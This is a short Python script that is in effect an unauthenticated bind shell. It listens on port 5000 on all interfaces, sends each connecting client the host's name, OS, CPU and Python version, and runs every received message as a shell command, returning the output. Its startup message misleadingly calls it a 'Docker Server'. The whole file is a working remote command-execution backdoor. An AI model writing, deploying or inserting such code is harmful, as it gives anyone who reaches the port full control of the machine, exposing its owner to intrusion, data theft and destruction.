#Import libraries
import subprocess 
import os
import socket
import threading
import platform


#Connection settings
IP = "0.0.0.0" #Set own IP here
Port = 5000 #Port to connect to
Address = (IP, Port)
S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
S.bind(Address)


#Connection handler, checks if you are connected, sends server specs and name to the client, then handles messages. Type "end" to stop
def Handle(conn, addr):
    connected = True
    conn.send(platform.node().encode('utf-8'))
    spec = "OS: "
    spec += platform.platform()
    spec += "\nCPU: "
    spec += platform.processor()
    spec += "\nPyVersion: "
    spec += platform.python_version()
    conn.send(spec.encode('utf-8'))
    while connected == True:
        Msg = conn.recv(1024).decode('utf-8')
        if Msg == "end":
            connected = False
            print(addr, " disconnected")
        else:
            try:
                stream = os.popen(Msg)
                output = stream.read()
                print(output, ".")
                output += " "
                conn.send(output.encode('utf-8'))
            except:
                print("ERROR")
                conn.send("ERROR".encode('utf-8'))


#Listens for connections and prints if someone connects
def Start():
    S.listen()
    print(f"Listening on {IP}...")
    while True:
        Conn, Addr = S.accept()
        print(f"{Addr} is connecting...")
        Thread = threading.Thread(target=Handle, args=(Conn, Addr))
        Thread.start()
        print(f"Clients connected: {threading.activeCount() - 1}")


#Starts the script
print("Starting Docker Server...")
Start()




















